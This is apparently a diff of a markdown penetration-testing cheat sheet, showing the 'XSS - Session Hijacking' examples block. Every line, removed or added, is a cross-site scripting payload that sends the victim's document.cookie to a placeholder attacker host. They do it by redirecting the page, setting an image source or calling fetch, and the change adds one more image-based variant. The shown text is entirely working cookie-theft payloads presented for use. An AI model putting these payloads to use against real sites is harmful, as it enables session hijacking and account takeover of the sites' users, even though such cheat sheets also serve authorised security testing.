@@ -311,10 +311,11 @@ https://malwaredecoder.com/
 ### XSS - Session Hijacking
 -> Examples
 ```
-<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>  
-<script>window.location="http://ip/?cookie="+document.cookie;</script>
-<script>document.location="http://ip/?cookie="+document.cookie;</script>  
-<script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>
+<script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
+<script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
+<script>window.location="http://<IP>/?cookie="+document.cookie;</script>
+<script>document.location="http://<IP>/?cookie="+document.cookie;</script>  
+<script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
 ```
 
 ### Tools
